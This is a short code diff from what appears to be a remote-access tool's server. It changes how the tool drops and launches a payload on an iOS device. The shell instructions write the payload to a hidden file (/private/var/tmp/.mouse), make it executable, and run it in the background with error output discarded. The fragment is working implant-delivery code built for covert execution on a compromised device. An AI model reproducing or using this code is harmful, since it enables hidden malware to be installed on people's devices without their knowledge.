@@ -140,10 +140,9 @@ class Server:
             payload = f.read()
             f.close()
             instructions = \
-            "cat >/tmp/mouse;"+\
-            "chmod 777 /tmp/mouse;"+\
-            "mv /tmp/mouse /.mouse;"+\
-            "/.mouse "+payload_parameter.decode()+" 2>/dev/null &\n"
+            "cat >/private/var/tmp/.mouse;"+\
+            "chmod +x /private/var/tmp/.mouse;"+\
+            "/private/var/tmp/.mouse "+payload_parameter.decode()+" 2>/dev/null &\n"
             self.verbose_print("Executing iOS payload...") 
             return (instructions,payload)
         else:
